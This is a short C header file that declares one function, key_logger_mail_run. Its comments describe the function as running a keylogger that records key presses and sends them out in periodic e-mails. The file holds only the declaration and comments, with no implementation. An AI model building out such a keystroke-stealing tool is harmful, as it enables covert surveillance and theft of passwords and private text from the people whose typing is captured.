
/******************************************************************************************************
 * @file key_logger_mail.h                                                                            *
 * @date:      @author:                   Reason for change:                                          *
 * 08.08.2023  Gaina Stefan               Initial version.                                            *
 * @details This file defines the function that runs the key logger that sends periodical e-mails.    *
 * @todo N/A.                                                                                         *
 * @bug No known bugs.                                                                                *
 *****************************************************************************************************/

#ifndef KEY_LOGGER_MAIL_H_
#define KEY_LOGGER_MAIL_H_

/******************************************************************************************************
 * HEADER FILE INCLUDES                                                                               *
 *****************************************************************************************************/

#include <stdbool.h>

/******************************************************************************************************
 * FUNCTION PROTOTYPES                                                                                *
 *****************************************************************************************************/

/**
 * @brief This is a blocking function, logging the key presses and sending e-mails.
 * @param void
 * @return false - key logger failed to start | true - key logger ran successfully.
*/
extern bool key_logger_mail_run(void);

#endif /*< KEY_LOGGER_MAIL_H_ */
